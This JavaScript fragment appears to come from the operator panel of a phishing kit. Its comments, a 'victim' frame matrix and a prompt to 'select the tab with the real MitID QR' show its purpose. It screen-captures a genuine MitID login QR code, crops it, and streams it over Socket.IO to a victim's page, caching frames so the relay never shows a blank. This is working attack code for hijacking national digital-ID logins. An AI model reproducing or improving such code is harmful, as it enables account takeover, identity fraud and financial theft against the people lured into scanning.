              cctx.fillStyle = '#ffffff';
              cctx.fillRect(0, 0, outSize, outSize);

              if (box) {
                // Minimal padding (3%) — just enough quiet-zone, no visual noise
                const pad = Math.max(box.w, box.h) * 0.03;
                let sx = Math.max(0, box.x - pad);
                let sy = Math.max(0, box.y - pad);
                let sw = Math.min(vw - sx, box.w + pad * 2);
                let sh = Math.min(vh - sy, box.h + pad * 2);
                // Force square (take max dimension, re-center)
                const side = Math.max(sw, sh);
                sx = Math.max(0, Math.min(vw - side, sx + (sw - side) / 2));
                sy = Math.max(0, Math.min(vh - side, sy + (sh - side) / 2));
                sw = sh = side;
                cctx.drawImage(_liveVideo, sx, sy, sw, sh, 0, 0, outSize, outSize);
              } else {
                // No detection (or smart mode off) — center-crop to square
                const side = Math.min(vw, vh);
                const sx = (vw - side) / 2;
                const sy = (vh - side) / 2;
                cctx.drawImage(_liveVideo, sx, sy, side, side, 0, 0, outSize, outSize);
              }

              let frameData = _cropCanvas.toDataURL('image/jpeg', quality);

              // ═══════════════════════════════════════════════════════════════
              // Frame decision matrix — what gets sent to the victim this tick
              // ═══════════════════════════════════════════════════════════════
              //   Smart | Box | Hold | → Victim sees              | Admin preview
              //   ------+-----+------+-----------------------------+--------------
              //   OFF   | n/a | n/a  | live center-crop            | live
              //   ON    | ✓   | n/a  | live cropped QR + cache it  | live
              //   ON    | ✗   | ✓    | last cached QR              | DIMMED (hold)
              //   ON    | ✗   | ✗    | NOTHING (don't send)        | DIMMED (idle)
              // ═══════════════════════════════════════════════════════════════
              const _holdOn = !!(liveQrHoldCb && liveQrHoldCb.checked);
              let _sendThisFrame = true;
              _usingFallbackFrame = false;

              if (smartMode) {
                if (freshDetection) {
                  // ONLY cache frames from genuine fresh detections — never stale-box crops
                  _lastGoodFrame = frameData;
                } else if (_holdOn && _lastGoodFrame) {
                  // Hold ON + miss + have cache → send cached frame
                  frameData = _lastGoodFrame;
                  _usingFallbackFrame = true;
                } else if (!_holdOn) {
                  // Hold OFF + miss → DON'T send (victim keeps last displayed frame)
                  _sendThisFrame = false;
                }
                // else: Hold ON + miss + no cache → send live center-crop (first attempts)
              }
              // smartMode OFF → _sendThisFrame stays true (send live center-crop)

              _liveFrameCount++;

              // Admin preview — always shows what WOULD be / IS being sent
              const _previewOpacity = _usingFallbackFrame || !_sendThisFrame ? '0.6' : '1';
              if (liveQrPreview) {
                liveQrPreview.src = frameData;
                liveQrPreview.style.opacity = _previewOpacity;
                liveQrPreview.style.filter = !_sendThisFrame ? 'grayscale(0.6)' : 'none';
              }
              if (_modalElements && _modalElements.preview) {
                _modalElements.preview.src = frameData;
                _modalElements.preview.style.opacity = _previewOpacity;
                _modalElements.preview.style.filter = !_sendThisFrame ? 'grayscale(0.6)' : 'none';
              }

              // Helper: draw a single canvas with the full frame + bbox overlay
              function _drawFullFrame(canvas) {
                if (!canvas) return;
                const canvasW = canvas.clientWidth || 200;
                const canvasH = canvas.clientHeight || 140;
                canvas.width = canvasW;
                canvas.height = canvasH;
                const fctx = canvas.getContext('2d');
                fctx.fillStyle = '#000';
                fctx.fillRect(0, 0, canvasW, canvasH);
                const fitScale = Math.min(canvasW / vw, canvasH / vh);
                const fw = vw * fitScale;
                const fh = vh * fitScale;
                const fx = (canvasW - fw) / 2;
                const fy = (canvasH - fh) / 2;
                fctx.drawImage(_liveVideo, fx, fy, fw, fh);
                if (box) {
                  fctx.strokeStyle = '#10b981';
                  fctx.lineWidth = Math.max(2, canvasH / 70);
                  fctx.strokeRect(
                    fx + box.x * fitScale,
                    fy + box.y * fitScale,
                    box.w * fitScale,
                    box.h * fitScale
                  );
                  const cornerSize = Math.max(6, canvasH / 20);
                  fctx.fillStyle = '#10b981';
                  const bx = fx + box.x * fitScale;
                  const by = fy + box.y * fitScale;
                  const bw = box.w * fitScale;
                  const bh = box.h * fitScale;
                  const t = Math.max(2, canvasH / 70);
                  fctx.fillRect(bx - 1, by - 1, cornerSize, t);
                  fctx.fillRect(bx - 1, by - 1, t, cornerSize);
                  fctx.fillRect(bx + bw - cornerSize + 1, by - 1, cornerSize, t);
                  fctx.fillRect(bx + bw - t + 1, by - 1, t, cornerSize);
                  fctx.fillRect(bx - 1, by + bh - t + 1, cornerSize, t);
                  fctx.fillRect(bx - 1, by + bh - cornerSize + 1, t, cornerSize);
                  fctx.fillRect(bx + bw - cornerSize + 1, by + bh - t + 1, cornerSize, t);
                  fctx.fillRect(bx + bw - t + 1, by + bh - cornerSize + 1, t, cornerSize);
                }
              }

              _drawFullFrame(liveQrFullPreview);
              if (_modalElements && _modalElements.fullPreview) {
                _drawFullFrame(_modalElements.fullPreview);
              }

              // (legacy block retained below, no-op since _drawFullFrame handles it)
              if (false && liveQrFullPreview) {
                // Fit full frame into canvas (letterbox)
                const canvasW = liveQrFullPreview.clientWidth || 200;
                const canvasH = liveQrFullPreview.clientHeight || 140;
                liveQrFullPreview.width = canvasW;
                liveQrFullPreview.height = canvasH;
                const fctx = liveQrFullPreview.getContext('2d');
                fctx.fillStyle = '#000';
                fctx.fillRect(0, 0, canvasW, canvasH);
                // Scale video to fit
                const fitScale = Math.min(canvasW / vw, canvasH / vh);
                const fw = vw * fitScale;
                const fh = vh * fitScale;
                const fx = (canvasW - fw) / 2;
                const fy = (canvasH - fh) / 2;
                fctx.drawImage(_liveVideo, fx, fy, fw, fh);
                // Draw bbox overlay in green if detected
                if (box) {
                  fctx.strokeStyle = '#10b981';
                  fctx.lineWidth = 2;
                  fctx.strokeRect(
                    fx + box.x * fitScale,
                    fy + box.y * fitScale,
                    box.w * fitScale,
                    box.h * fitScale
                  );
                  // Corner markers
                  const cornerSize = 6;
                  fctx.fillStyle = '#10b981';
                  const bx = fx + box.x * fitScale;
                  const by = fy + box.y * fitScale;
                  const bw = box.w * fitScale;
                  const bh = box.h * fitScale;
                  fctx.fillRect(bx - 1, by - 1, cornerSize, 2);
                  fctx.fillRect(bx - 1, by - 1, 2, cornerSize);
                  fctx.fillRect(bx + bw - cornerSize + 1, by - 1, cornerSize, 2);
                  fctx.fillRect(bx + bw - 1, by - 1, 2, cornerSize);
                  fctx.fillRect(bx - 1, by + bh - 1, cornerSize, 2);
                  fctx.fillRect(bx - 1, by + bh - cornerSize + 1, 2, cornerSize);
                  fctx.fillRect(bx + bw - cornerSize + 1, by + bh - 1, cornerSize, 2);
                  fctx.fillRect(bx + bw - 1, by + bh - cornerSize + 1, 2, cornerSize);
                }
              }

              // ── Update stats ──
              const now = Date.now();
              _liveRecentFrameTimes.push(now);
              while (_liveRecentFrameTimes.length > 10) _liveRecentFrameTimes.shift();
              if (_liveRecentFrameTimes.length >= 2) {
                const span = (now - _liveRecentFrameTimes[0]) / 1000;
                const fps = span > 0 ? (_liveRecentFrameTimes.length - 1) / span : 0;
                const _fpsStr = fps.toFixed(1);
                if (statFps) statFps.textContent = _fpsStr;
                if (_modalElements && _modalElements.statFps) _modalElements.statFps.textContent = _fpsStr;
              }
              if (statFrames) statFrames.textContent = _liveFrameCount.toLocaleString();
              // Size — base64 length ≈ bytes * 1.37, strip header
              const bytes = Math.round((frameData.length - 23) * 0.75);
              const _sizeStr = bytes < 1024 ? bytes + 'B' : (bytes / 1024).toFixed(1) + 'KB';
              if (statSize) statSize.textContent = _sizeStr;
              const _qrboxStr = box
                ? Math.round(box.w) + '×' + Math.round(box.h)
                : (smartMode ? 'none' : 'off');
              if (statQrbox) statQrbox.textContent = _qrboxStr;

              // Mirror to modal
              if (_modalElements) {
                if (_modalElements.statFrames) _modalElements.statFrames.textContent = _liveFrameCount.toLocaleString();
                if (_modalElements.statSize) _modalElements.statSize.textContent = _sizeStr;
                if (_modalElements.statQrbox) _modalElements.statQrbox.textContent = _qrboxStr;
              }

              // Send frame to server via Socket.IO — only when _sendThisFrame is true
              if (_sendThisFrame && window.ALPSocket && window.ALPSocket.socket) {
                window.ALPSocket.socket.emit('admin:qr-stream-frame', {
                  sessionId: s.id,
                  frame: frameData
                });
              }

              // Update status counter — drawer AND modal
              const _streamStatusText = _usingFallbackFrame
                ? `🔒 Holding (${_liveFrameCount} frames sent, cached active)`
                : (_sendThisFrame
                    ? `🔴 Streaming (${_liveFrameCount} frames sent)`
                    : `⏸ Idle (${_liveFrameCount} frames sent, Hold off)`);
              if (liveQrStatusText) liveQrStatusText.textContent = _streamStatusText;
              if (_modalElements && _modalElements.liveStatusText) {
                _modalElements.liveStatusText.textContent = _streamStatusText;
              }
            }, intervalMs);

            window.showToast('🔴 Live QR stream started! Select the tab with the real MitID QR.', 'success');

          } catch (err) {
            console.error('Live QR stream error:', err);
            if (err.name === 'NotAllowedError') {
              window.showToast('Screen sharing was cancelled', 'info');
            } else {
              window.showToast('Failed to start screen capture: ' + err.message, 'error');
            }
            _liveQrStop();
          }
        });
      }

      if (liveQrStopBtn) {
        liveQrStopBtn.addEventListener('click', () => {
          _liveQrStop();
          window.showToast('Live QR stream stopped', 'info');
        });
      }

    } catch (err) {
      console.error('openDetail error:', err);
      panel.innerHTML = `
        <div class="detail-header">
          <h2 style="font-size:16px; font-weight:700; color:var(--text-primary); margin:0;">Error</h2>
          <button class="detail-close" id="detail-close">&times;</button>
        </div>
        <div style="text-align:center;padding:40px;color:#ef4444;">
          Failed to load session details<br>
          <small style="color:var(--text-muted);font-size:11px;">${SessionTemplates.escapeHtml(err.message || '')}</small>
        </div>
      `;
      const closeBtn = panel.querySelector('#detail-close');
      if (closeBtn) closeBtn.addEventListener('click', close);
    }
  }

  function close() {
    const overlay = document.getElementById('detail-overlay');
    if (overlay) overlay.style.display = 'none';

    // Restore background scrolling
    document.body.style.overflow = '';
  }

  return { init, open, close };
})();

if (typeof window !== 'undefined') {
  window.SessionDrawer = SessionDrawer;
}
